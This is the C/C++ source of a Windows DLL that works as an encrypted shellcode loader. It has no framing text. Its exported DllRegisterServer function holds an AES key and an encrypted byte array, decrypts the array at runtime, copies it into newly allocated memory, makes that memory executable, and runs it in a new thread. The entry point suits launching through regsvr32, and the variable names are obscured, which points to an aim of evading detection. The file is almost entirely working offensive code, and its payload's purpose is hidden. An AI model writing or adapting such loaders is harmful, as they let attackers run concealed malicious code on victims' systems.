#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
void dec(char* sh, DWORD lung, char* chia, DWORD chialun) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)chia, chialun, 0)) {
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)sh, &lung)) {
        return;
    }
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
extern "C" {
    __declspec(dllexport) BOOL WINAPI DllRegisterServer(void) {

        char asaak[] = {0xbe, 0x91, 0x65, 0x2d, 0x4, 0x89, 0x3f, 0x65, 0xe5, 0x4b, 0xef, 0x7b, 0x5e, 0xc1, 0x76, 0x4f };
        unsigned char payme[] = {0xeb, 0xa, 0x44, 0xdd, 0xcc, 0xaf, 0xcb, 0x7c, 0xe6, 0xcf, 0x97, 0xf6, 0x45, 0xd5, 0x1, 0xe8, 0x15, 0x28, 0xc9, 0xa5, 0x81, 0x54, 0xef, 0x35, 0x1f, 0x66, 0x46, 0x91, 0xb9, 0x5b, 0xcb, 0x53, 0xaf, 0x87, 0x12, 0x3d, 0x70, 0x53, 0xec, 0xf4, 0x63, 0x9f, 0xc2, 0x6, 0x3e, 0x82, 0x7f, 0x18, 0x8c, 0xf, 0x24, 0xc4, 0xef, 0xba, 0xd5, 0xa, 0xc7, 0x50, 0xf7, 0xe9, 0x3f, 0x1d, 0x46, 0x62, 0x24, 0xce, 0xe9, 0xf8, 0x12, 0x6b, 0x45, 0x76, 0x54, 0x61, 0xe9, 0x34, 0x33, 0x69, 0x5e, 0x5f, 0x37, 0xae, 0xc3, 0x48, 0x92, 0x23, 0xb3, 0x4b, 0xce, 0xef, 0xd0, 0xc, 0x13, 0x8f, 0x23, 0x25, 0x1f, 0x97, 0x56, 0xaa, 0xe6, 0x50, 0xb6, 0xbf, 0x6e, 0x55, 0xfb, 0x18, 0x7, 0xe8, 0x7a, 0x9c, 0x84, 0xf8, 0x3d, 0xaf, 0x33, 0xaf, 0x4a, 0xfe, 0x34, 0xd7, 0xf1, 0x64, 0x9b, 0x3c, 0x7, 0x72, 0xa7, 0x39, 0x3, 0xa3, 0x37, 0xe2, 0x31, 0xd6, 0xbc, 0xa2, 0x4e, 0x9a, 0xdb, 0x6c, 0x32, 0xbb, 0xde, 0xf2, 0x9b, 0x13, 0x9b, 0x4d, 0x54, 0x7d, 0xa9, 0xe1, 0x44, 0xcf, 0x50, 0xf1, 0xcd, 0xe4, 0x81, 0x8c, 0xba, 0x56, 0xa8, 0x30, 0xee, 0x1, 0xba, 0x6f, 0x51, 0x1b, 0x1b, 0xd3, 0x92, 0x5a, 0x85, 0xd4, 0xb1, 0x4d, 0x11, 0x52, 0xce, 0x9f, 0xfd, 0x9f, 0x46, 0xa0, 0x42, 0xb7, 0xb6, 0xab, 0xc9, 0x48, 0x2f, 0x8a, 0xf2, 0x12, 0xc6, 0x4e, 0xaa, 0x44, 0x63, 0x1d, 0x6a, 0xbe, 0xc1, 0x38, 0xab, 0x1d, 0xc3, 0xd6, 0xf4, 0x87, 0x23, 0xd0, 0x80, 0xdd, 0xda, 0x46, 0x85, 0x11, 0x44, 0x43, 0x37, 0x9f, 0x53, 0xbf, 0xe5, 0xe7, 0xcd, 0x95, 0xaf, 0x6, 0xca, 0xb7, 0x57, 0xe4, 0xbf, 0x17, 0xa0, 0x9f, 0x31, 0xec, 0xf0, 0x5b, 0x6d, 0xfa, 0x72, 0x60, 0xbb, 0x93, 0x3a, 0x29, 0xa8, 0x15, 0x85, 0xa1, 0x5e, 0xdd, 0xc2, 0x17, 0x46, 0xf, 0x65, 0xeb, 0x1, 0x7f, 0x52, 0xd1, 0xba, 0x88, 0x92, 0xad, 0x81, 0x1d, 0xa4, 0x25, 0x7d, 0x3, 0x98, 0xa5, 0xe6, 0x50, 0x15, 0x84, 0x1b, 0xc };
        DWORD paymelungo = sizeof(payme);
        LPVOID dammimem = VirtualAlloc(NULL, sizeof(payme), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!dammimem) {
            return -1;
        }
        dec((char*)payme, paymelungo, asaak, sizeof(asaak));
        //MoveMemory(dammimem, payme, sizeof(payme));
        RtlMoveMemory(dammimem, payme, sizeof(payme));
        DWORD oldProtect;
        if (!VirtualProtect(dammimem, sizeof(payme), PAGE_EXECUTE_READ, &oldProtect)) {
            return -2;
        }
        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dammimem, NULL, 0, NULL);
        if (!tHandle) {
            return -3;
        }
        printf("\n\nalloc_mem : %p\n", dammimem);
        WaitForSingleObject(tHandle, INFINITE);
        ((void(*)())dammimem)();
        return 0;
        return TRUE;
    }
}